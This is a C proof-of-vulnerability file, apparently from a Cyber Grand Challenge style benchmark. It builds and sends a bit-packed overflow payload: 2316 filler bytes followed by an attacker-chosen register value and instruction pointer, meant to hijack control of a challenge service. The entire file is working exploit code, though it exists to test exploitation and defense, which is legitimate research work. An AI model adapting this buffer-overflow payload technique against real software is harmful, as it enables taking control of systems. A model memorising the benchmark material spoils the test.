#include <libpov.h>

typedef struct bit_io {
    unsigned char *data;
    unsigned int didx;
    unsigned int bidx;
} bio_t;

static char *_print_base(char *outend, int *n, unsigned int val, unsigned int base, int uppercase)
{
    *n = 0;
    if (base < 2 || base > 16)
        return outend;

    if (val == 0)
    {
        *n = 1;
        *(--outend) = '0';
        return outend;
    }

    const char *str;
    if (uppercase)
        str = "0123456789ABCDEF";
    else
        str = "0123456789abcdef";

    while (val > 0)
    {
        (*n)++;
        *(--outend) = str[val % base];
        val /= base;
    }

    return outend;
}

static char *_print_signed(char *outbuf, int *n, int val)
{
    int neg = 0;
    if (val < 0)
    {
        neg = 1;
        val = -val;
    }
    char *s = _print_base(outbuf, n, (unsigned int)val, 10, 0);
    if (neg)
    {
        *(--s) = '-';
        (*n)++;
    }
    return s;
}


bio_t* bit_new(unsigned char *data)
{
    bio_t *bio = (bio_t *) malloc(sizeof(bio_t));
    bio->data = data;
    bio->didx = 0;
    bio->bidx = 0;

    return bio;
}

void bit_write(bio_t *bio, unsigned char data, size_t n)
{
    size_t i;
    unsigned char b = bio->data[bio->didx];
    for (i = 0; i < n; ++i)
    {
        if (bio->bidx == 8)
        {
            bio->data[bio->didx] = b;
            b = bio->data[++bio->didx];
            bio->bidx = 0;
        }
        unsigned char c = (data & (1 << (8 - i - 1))) >> (8 - i - 1);
        b |= (c << (8 - bio->bidx - 1));
        bio->bidx++;
    }
    bio->data[bio->didx] = b;
}

int main(void) {
    negotiate_type1(0xfefefefe, 0xfefefefe, 5);

    int i, buf_len = 0;
    char buf[32], *pbuf;
    unsigned char exploit[4096];
    unsigned char *eip = NULL, *reg = NULL;
    unsigned int eip_len = 0, reg_len = 0, exp_len = 0;
    char *key = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";

    transmit_all(STDOUT, "2\n", 2);
    transmit_all(STDOUT, key, 95);

    eip = append_var("TYPE1_IP", eip, &eip_len);
    reg = append_var("TYPE1_REG", reg, &reg_len);

    memset(exploit, 0, sizeof(exploit));
    bio_t *bio = bit_new(exploit);

    for (i = 0; i < 2316; ++i)
    {
        bit_write(bio, '\x00', 1);
        bit_write(bio, '\x41', 8);
    }
    for (i = 0; i < 4; ++i)
    {
        bit_write(bio, '\x00', 1);
        bit_write(bio, reg[i], 8);
    }
    for (i = 0; i < 4; ++i)
    {
        bit_write(bio, '\x00', 1);
        bit_write(bio, eip[i], 8);
    }

    exp_len = bio->didx + !!(bio->bidx > 0);
    pbuf = _print_signed(buf + 32, &buf_len, exp_len + 4);
    transmit_all(STDOUT, pbuf, buf_len);
    transmit_all(STDOUT, "\n", 1);
    buf_len = 2316 + 4 + 4;
    transmit_all(STDOUT, (char *)&buf_len, 4);
    transmit_all(STDOUT, exploit, exp_len);
    return 0;
}
